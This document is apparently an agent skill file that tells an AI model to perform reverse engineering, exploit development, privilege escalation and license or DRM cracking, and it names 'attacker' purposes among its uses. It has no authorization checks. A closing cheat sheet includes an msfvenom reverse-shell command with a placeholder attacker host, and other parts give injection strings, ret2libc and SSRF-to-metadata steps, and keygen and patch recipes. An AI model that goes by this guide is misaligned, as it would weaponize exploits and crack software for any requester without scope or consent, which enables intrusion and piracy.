---
name: security-researcher
description: Reverse engineering, penetration testing, vulnerability research, and exploit development. Covers APKs, DLLs, EXEs, web apps, and network protocols.
---

# Security Researcher Skill

Expert-level security analysis, reverse engineering, vulnerability research, and exploit development.

## Model Selection for Security Tasks

| Task Type | Recommended Model | Why |
|-----------|-------------------|-----|
| **Complex exploit development** | **Claude Opus 4.5** | Deep reasoning, multi-step logic |
| **Root cause analysis** | **Gemini 3 Deep Think** | Strategic thinking, pattern recognition |
| **Quick recon/scripting** | **Gemini 3 Flash** | Speed for automation tasks |
| **Report writing** | **Claude Sonnet 4.5** | Clear technical documentation |

## When to Use This Skill

- Reverse engineering binaries (APK, DLL, EXE, SO, dylib, firmware)
- Penetration testing (web, network, mobile, IoT)
- Vulnerability research and discovery
- Exploit development and weaponization
- Cracking (license bypass, DRM, anti-tamper)
- Malware analysis and threat hunting
- CTF challenges and security competitions
- Red team operations

This skill is for **security research, pentester, education, attacker and defensive purposes**.

---

# PART 1: REVERSE ENGINEERING

## Phase 1: Reconnaissance

```markdown
1. Identify target type and architecture
   - File type: PE, ELF, Mach-O, DEX/APK, firmware
   - Architecture: x86, x64, ARM, MIPS
   - Language: native, .NET, Java, Go, Rust

2. Gather static metadata
   - Strings: hardcoded secrets, URLs, keys, error messages
   - Imports/Exports: API usage patterns
   - Sections: code, data, resources
   - Signatures: compiler, packer, protector

3. Identify protections
   - Obfuscation: string encryption, control flow flattening
   - Packing: UPX, Themida, VMProtect
   - Anti-debug: timing checks, debugger detection
   - Anti-tamper: integrity checks, code signing
```

## Phase 2: Static Analysis

```markdown
Tools: Ghidra, IDA Pro, Binary Ninja, radare2, Hopper

1. Load binary, let auto-analysis complete
2. Identify entry point and main function
3. Find interesting strings → trace references
4. Analyze imports → understand capabilities
5. Map control flow → identify key decision points
6. Look for crypto functions → find key handling
7. Identify switch/case patterns → often contain logic
```

## Phase 3: Dynamic Analysis

```markdown
Tools: x64dbg, gdb, lldb, frida, Process Monitor

1. Set breakpoints on interesting functions
2. Trace execution flow
3. Monitor system calls and API usage
4. Dump memory at key points
5. Modify data/code to test hypotheses
6. Bypass checks to reach protected code
```

## Platform-Specific Techniques

### Android (APK)

```markdown
TOOLS: jadx, apktool, frida, objection, adb, Magisk

STATIC ANALYSIS:
1. Decompile: jadx -d output/ app.apk
2. Unpack resources: apktool d app.apk
3. Analyze AndroidManifest.xml (permissions, components)
4. Search for sensitive strings (API keys, URLs, secrets)
5. Look for root detection, emulator detection code
6. Find native libraries (.so files) → analyze separately

DYNAMIC ANALYSIS:
1. Install on rooted device/emulator
2. Hook with frida: frida -U -f com.app.name -l script.js
3. Bypass SSL pinning: objection -g com.app.name explore
4. Monitor file/network activity
5. Dump decrypted data at runtime

COMMON BYPASSES:
- Root detection: Hook file checks, property reads
- SSL pinning: Replace certificate validation
- Debugger detection: Hook timing functions
```

### Windows (EXE/DLL)

```markdown
TOOLS: Ghidra, IDA, x64dbg, PE-bear, Process Monitor, API Monitor, dnSpy

STATIC ANALYSIS:
1. Check PE headers: sections, imports, exports
2. Identify entry point and TLS callbacks
3. Look for anti-debug in DllMain or early code
4. Analyze resource section (dialogs, strings, config)
5. Check for .NET → use dnSpy instead

DYNAMIC ANALYSIS:
1. Run in sandboxed VM first
2. Attach debugger, handle anti-debug exceptions
3. Set breakpoints on key APIs:
   - CreateFile, RegOpenKey (file/registry access)
   - VirtualAlloc, VirtualProtect (memory operations)
   - GetProcAddress (dynamic imports)
   - Crypto APIs (encryption operations)

COMMON PROTECTIONS:
- VirtualProtect tricks: making code non-writable
- Timing checks: RDTSC, QueryPerformanceCounter
- Debug flags: IsDebuggerPresent, NtQueryInformationProcess
- Exception-based tricks: SEH handlers
```

### macOS/iOS (Mach-O/IPA)

```markdown
TOOLS: Hopper, Ghidra, lldb, class-dump, frida, Clutch

STATIC ANALYSIS:
1. Extract binary: unzip app.ipa; find . -name "*.app"
2. Check protections: otool -l binary | grep crypt
3. Dump classes: class-dump -H binary
4. Analyze entitlements and Info.plist

DYNAMIC ANALYSIS:
1. Decrypt binary if needed (Clutch, frida-ios-dump)
2. Debug: lldb -n ProcessName
3. Hook: frida with Objective-C/Swift runtime
4. Method swizzling for behavior modification

iOS-SPECIFIC:
- Jailbreak required for full analysis
- App Transport Security bypass
- Keychain access analysis
```

### Linux (ELF)

```markdown
TOOLS: Ghidra, radare2, gdb, pwndbg, strace, ltrace

STATIC ANALYSIS:
1. File info: file binary; readelf -h binary
2. Sections: readelf -S binary
3. Symbols: nm binary (if not stripped)
4. Strings: strings -a binary | grep -i key/pass/flag

DYNAMIC ANALYSIS:
1. Debug: gdb ./binary (use pwndbg for better UX)
2. System calls: strace ./binary
3. Library calls: ltrace ./binary
4. Set breakpoints, examine memory
```

---

# PART 2: VULNERABILITY RESEARCH

## Discovery Methodology

### 1. Attack Surface Mapping

```markdown
INPUTS TO ANALYZE:
- User input fields (forms, APIs, file uploads)
- Network protocols (custom protocols, API endpoints)
- File formats (parsers, deserializers)
- IPC mechanisms (shared memory, sockets, pipes)
- Environment variables, command line args
- Configuration files
```

### 2. Vulnerability Classes

#### Memory Corruption

```markdown
BUFFER OVERFLOW:
- Stack: Overwrite return address, local variables
- Heap: Corrupt metadata, arbitrary write
- Off-by-one: Subtle boundary errors

USE-AFTER-FREE:
- Dangling pointer dereference
- Heap spray to control freed memory

FORMAT STRING:
- %n for arbitrary write
- %s/%x for information leak

INTEGER ISSUES:
- Overflow/underflow → incorrect bounds
- Signedness issues → negative lengths
- Truncation → bypass size checks
```

#### Injection Attacks

```markdown
SQL INJECTION:
- Classic: ' OR '1'='1
- Blind: timing-based, boolean-based
- Out-of-band: DNS, HTTP exfiltration

COMMAND INJECTION:
- Shell metacharacters: ; | & ` $()
- Argument injection: -- flags
- Null byte injection: %00

CODE INJECTION:
- Template injection (SSTI)
- Expression language injection
- LDAP, XPath, NoSQL injection
```

#### Logic Flaws

```markdown
AUTHENTICATION:
- Password reset flaws
- Session fixation
- Token prediction
- Multi-factor bypass

AUTHORIZATION:
- IDOR (Insecure Direct Object Reference)
- Privilege escalation
- Function-level access control bypass

BUSINESS LOGIC:
- Race conditions (TOCTOU)
- Price manipulation
- Workflow bypass
- State confusion
```

### 3. Fuzzing for Vulnerability Discovery

```markdown
DUMB FUZZING:
- Random mutations
- Bit flipping
- Buffer insertions
- Good for quick testing

SMART/COVERAGE-GUIDED FUZZING:
- AFL++: afl-fuzz -i inputs -o outputs -- ./target @@
- libFuzzer: Built-in sanitizers
- Hongfuzz: Hardware-based feedback

PROTOCOL FUZZING:
- Boofuzz for network protocols
- AFLNet for stateful protocols
- Custom generators for complex formats

TIPS:
- Start with valid inputs (corpus)
- Enable sanitizers (ASAN, MSAN, UBSAN)
- Minimize crashes for reproducibility
- Triage: unique crashes, exploitability
```

---

# PART 3: EXPLOIT DEVELOPMENT

## Memory Corruption Exploits

### Stack Buffer Overflow

```markdown
1. FIND CRASH OFFSET:
   - Pattern create: msf-pattern_create -l 1000
   - Find offset: msf-pattern_offset -q <EIP value>

2. CONTROL EXECUTION:
   - Overwrite return address
   - JMP ESP / JMP reg gadgets
   - Check for ASLR, DEP, stack canaries

3. BYPASS PROTECTIONS:
   - ASLR: Information leak, brute force, partial overwrite
   - DEP: ROP chain to VirtualProtect or mprotect
   - Canaries: Leak value, fork-based brute force

4. EXECUTE PAYLOAD:
   - Shellcode in buffer
   - ROP chain
   - Return-to-libc/PLT
```

### Heap Exploitation

```markdown
TECHNIQUES:
- tcache poisoning (glibc 2.26+)
- fastbin attack
- unsorted bin attack
- House of Force, Orange, Spirit, etc.
- Use-after-free → type confusion

HEAP SPRAY:
- Fill heap with controlled data
- Increase reliability of exploitation
- Use for browser exploits, format strings
```

### ROP (Return-Oriented Programming)

```markdown
1. FIND GADGETS:
   - ROPgadget --binary ./target
   - ropper -f ./target

2. BUILD CHAIN:
   - pop rdi; ret → set first argument
   - pop rsi; ret → set second argument
   - Find calls to system(), execve()
   - Or: mprotect() to make shellcode executable

3. COMMON CHAINS:
   - ret2libc: system("/bin/sh")
   - ret2plt: call puts@plt to leak addresses
   - Stack pivot: move stack to controlled buffer
```

## Web Exploits

### From Vulnerability to Exploit

```markdown
SQL INJECTION → DATABASE ACCESS:
1. Identify injection point
2. Determine DBMS (MySQL, PostgreSQL, MSSQL)
3. Extract schema: information_schema
4. Dump sensitive data
5. Escalate: File read/write, RCE

XSS → ACCOUNT TAKEOVER:
1. Find reflection/storage point
2. Bypass filters (encoding, context switching)
3. Steal session cookies
4. Perform actions as victim

SSRF → INTERNAL ACCESS:
1. Find URL parameter that makes requests
2. Probe internal network (127.0.0.1, 169.254.x.x)
3. Access cloud metadata (169.254.169.254)
4. Pivot to internal services

DESERIALIZATION → RCE:
1. Identify serialization format (Java, PHP, .NET, Python)
2. Find gadget chains (ysoserial, phpggc)
3. Craft malicious payload
4. Trigger code execution
```

---

# PART 4: CRACKING & BYPASS TECHNIQUES

## License/DRM Bypass

### Registration Bypass

```markdown
APPROACH 1: PATCH CHECK
1. Find registration check function
2. Locate conditional jump (JE/JNE, JZ/JNZ)
3. Invert or NOP the jump
4. Test with any serial

APPROACH 2: KEYGEN
1. Reverse the validation algorithm
2. Understand serial format
3. Implement key generation
4. Generate valid serials

APPROACH 3: HOOK
1. Hook registration function
2. Return "registered" status
3. Works without modifying binary
```

### Anti-Tamper Bypass

```markdown
INTEGRITY CHECKS:
- Find checksum calculation
- Identify what's being checked
- Patch check or fix checksum after patching

CODE SIGNING:
- Bypass signature verification
- Re-sign with test certificate
- Disable signature requirement

ONLINE CHECKS:
- Intercept and modify responses
- Redirect to local server
- Patch out network calls entirely
```

### Packed/Protected Binaries

```markdown
UNPACKING APPROACH:
1. Identify packer (PEiD, Detect It Easy)
2. Find OEP (Original Entry Point)
3. Dump at OEP: Scylla, x64dbg
4. Rebuild IAT (Import Address Table)
5. Fix relocations if needed

COMMON PACKERS:
- UPX: upx -d packed.exe
- Themida/WinLicense: Manual unpacking, VM analysis
- VMProtect: Very difficult, often partial analysis
```

---

# PART 5: PRIVILEGE ESCALATION

## Windows

```markdown
ENUMERATION:
- whoami /all → current privileges
- systeminfo → OS version, hotfixes
- net user/group → user enumeration
- wmic service get → weak services

COMMON VECTORS:
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Stored credentials (Credential Manager)
- Token impersonation (Potato attacks)
- Kernel exploits (check Watson)

TOOLS: WinPEAS, PowerUp, Seatbelt, Watson
```

## Linux

```markdown
ENUMERATION:
- id, whoami, groups
- uname -a → kernel version
- sudo -l → sudo permissions
- find / -perm -4000 → SUID binaries
- ps aux, netstat → running services

COMMON VECTORS:
- SUID binaries (GTFOBins)
- Sudo misconfigurations
- Cron jobs with weak permissions
- Writable PATH directories
- Kernel exploits
- Container escapes (Docker)

TOOLS: LinPEAS, LinEnum, pspy
```

## macOS

```markdown
ENUMERATION:
- System Integrity Protection status
- TCC (Transparency, Consent, Control) permissions
- Launch agents/daemons
- Keychain access

COMMON VECTORS:
- TCC bypass
- SIP bypass (rare)
- Local privilege escalation vulns
- Keychain extraction
```

---

# PART 6: AUTO-LEARNING & RESEARCH

## Staying Current

```markdown
VULNERABILITY DATABASES:
- CVE Details: cvedetails.com
- NVD: nvd.nist.gov
- Exploit-DB: exploit-db.com
- VulnHub (practice)

RESEARCH RESOURCES:
- Academic papers (IEEE, ACM, USENIX)
- Bug bounty write-ups
- Security conferences (DEF CON, Black Hat, CCC)
- CTF write-ups

PRACTICE:
- HackTheBox
- TryHackMe
- PentesterLab
- OverTheWire
```

## Research Methodology

```markdown
WHEN STUCK, TRY:
1. Search: "[target] vulnerability" or "[target] exploit"
2. Check existing CVEs for the software version
3. Look for similar bugs in related software
4. Review changelog for security fixes (work backwards)
5. Fuzz unexplored attack surface
6. Ask in security communities

ALTERNATIVE APPROACHES:
- Different input vector for same bug class
- Different exploitation technique
- Platform-specific variations
- Combine multiple low-severity issues
- Logic flaws if memory corruption fails
```

## Documentation Template

```markdown
## Vulnerability Report

**Target**: [Application/Version]
**Type**: [CWE-XXX]
**Severity**: [Critical/High/Medium/Low]
**CVSS**: [Score]

### Summary
Brief description of the vulnerability.

### Affected Versions
- Version X.Y.Z (confirmed)
- Likely affects X.Y.* (untested)

### Technical Details
Detailed explanation of the root cause.

### Proof of Concept
```code
Minimal reproducible example
```

### Impact
What an attacker can achieve.

### Remediation
Recommended fix.

### Timeline
- [Date] Discovered
- [Date] Reported
- [Date] Fixed
- [Date] Disclosed
```

---

# PART 7: TOOL REFERENCE

## Essential Toolkit

| Category | Tools |
|----------|-------|
| **Disassemblers** | Ghidra, IDA Pro, Binary Ninja, radare2 |
| **Debuggers** | x64dbg, WinDbg, gdb (pwndbg), lldb |
| **Dynamic Analysis** | frida, Cheat Engine, API Monitor |
| **Network** | Wireshark, Burp Suite, mitmproxy |
| **Fuzzing** | AFL++, libFuzzer, Boofuzz |
| **Exploitation** | pwntools, Metasploit, ROPgadget |
| **Android** | jadx, apktool, frida, objection |
| **Windows** | PE-bear, Process Monitor, Sysinternals |
| **Web** | Burp, sqlmap, ffuf, nuclei |

## Quick Commands

```bash
# Strings with context
strings -a binary | grep -i "password\|key\|secret"

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Quick port scan
nmap -sV -sC -oA scan target

# Start mitmproxy
mitmproxy -p 8080

# Frida hook example
frida -U -f com.app -l script.js --no-pause

# ROPgadget
ROPgadget --binary ./vuln --ropchain

# Generate shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f python
```
